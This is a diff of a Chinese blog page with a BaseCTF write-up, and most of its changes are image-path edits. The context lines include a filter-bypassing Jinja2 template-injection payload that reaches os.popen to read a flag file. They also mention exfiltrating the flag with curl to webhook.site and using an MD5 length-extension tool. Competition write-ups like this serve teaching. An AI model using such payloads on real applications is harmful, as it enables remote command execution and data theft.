@@ -309,7 +309,7 @@
 &lt;p&gt;这里使用&lt;a class=&#34;link&#34; href=&#34;https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;工具&lt;/a&gt;生成了，我是菜比&lt;/p&gt;
 &lt;p&gt;先输入random的文本长度，然后是random的hash，最后是我们希望拓展的字符串&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20240912194812065.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912194812065.png&#34;
 	
 	
 	
@@ -357,10 +357,9 @@
 	
 &gt;&lt;/p&gt;
 &lt;ol start=&#34;2&#34;&gt;
-&lt;li&gt;&lt;/li&gt;
+&lt;li&gt;利用curl命令和[webhook](&lt;a class=&#34;link&#34; href=&#34;https://webhook.site/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Webhook.site - Test, transform and automate Web requests and emails&lt;/a&gt;)进行信息外带出flag&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;利用curl命令和[webhook](&lt;a class=&#34;link&#34; href=&#34;https://webhook.site/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;Webhook.site - Test, transform and automate Web requests and emails&lt;/a&gt;)进行信息外带出flag&lt;/p&gt;
 &lt;p&gt;payload&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -525,7 +524,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;寻找一个含os模块能RCE的类，我这里懒得写脚本直接用Notepad++将逗号替换为换行符找到该模块的位置为137&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20240912204530622.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912204530622.png&#34;
 	
 	
 	
@@ -597,7 +596,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;后面查看该系统环境变量存在一个为根号的环境变量&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20240912205859146.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912205859146.png&#34;
 	
 	
 	
@@ -616,7 +615,7 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;BaseCTF{%print(&amp;#39;&amp;#39;[&amp;#39;_&amp;#39;&amp;#39;_cl&amp;#39;&amp;#39;ass_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;_&amp;#39;&amp;#39;_ba&amp;#39;&amp;#39;se_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;_&amp;#39;&amp;#39;_subcla&amp;#39;&amp;#39;sses_&amp;#39;&amp;#39;_&amp;#39;]()[137][&amp;#39;_&amp;#39;&amp;#39;_in&amp;#39;&amp;#39;it_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;_&amp;#39;&amp;#39;_glo&amp;#39;&amp;#39;bals_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;po&amp;#39;&amp;#39;pen&amp;#39;](&amp;#39;cd $OLDPWD;cat flag&amp;#39;)[&amp;#39;rea&amp;#39;&amp;#39;d&amp;#39;]())%}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20240912210153249.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912210153249.png&#34;
 	
 	
 	
